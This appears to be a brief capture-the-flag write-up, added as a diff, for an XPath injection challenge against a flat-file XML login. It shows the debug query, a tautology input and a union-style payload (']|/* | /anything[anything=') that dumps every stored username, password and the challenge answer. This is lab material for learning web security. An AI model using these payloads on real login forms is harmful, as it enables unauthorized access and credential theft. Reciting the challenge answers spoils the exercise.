@@ -1,0 +1,56 @@
+Drake has been experimenting with flatfile databases, as he has never had any success with MySQL. 
+But alas, more problems. Try and find the answer
+
+in page source we have for dubugging process put ?debug=true
+    Query was: /users/user[username='jayesh']/username | /users/user[password='8fvDV3ZHWM.3!dG']/password
+    Array()
+
+now we can actually see the query
+so this time we put ' or '1'='1 we get :
+    Array ( [0] => SimpleXMLElement Object ( [0] => XpAtHaDmIn ) [1] => SimpleXMLElement Object 
+    ( [0] => system ) [2] => SimpleXMLElement Object ( [0] => moshbat ) )
+but in the video they saw 3 more field
+
+swwning the syntax of the query i insert
+
+']|/* | /anything[anything='
+
+we get:
+    Query was: /users/user[username='']|/* | /anything[anything='']/username 
+    | /users/user[password='']|/* | /anything[anything='']/password
+
+    Array
+    (
+    [0] => SimpleXMLElement Object
+        (
+            [user] => Array
+                (
+                    [0] => SimpleXMLElement Object
+                        (
+                            [id] => 1
+                            [username] => XpAtHaDmIn
+                            [password] => z0mgXPATH!
+                            [answer] => You've successfully injected an XPath login, the password is: IloveXPath!
+                        )
+
+                    [1] => SimpleXMLElement Object
+                        (
+                            [id] => 2
+                            [username] => system
+                            [password] => elites0ft.com
+                            [answer] => You won't find the answer here.
+                        )
+
+                    [2] => SimpleXMLElement Object
+                        (
+                            [id] => 3
+                            [username] => moshbat
+                            [password] => systemisbetter
+                            [answer] => You won't find the answer here.
+                        )
+
+                )
+
+        )
+
+)
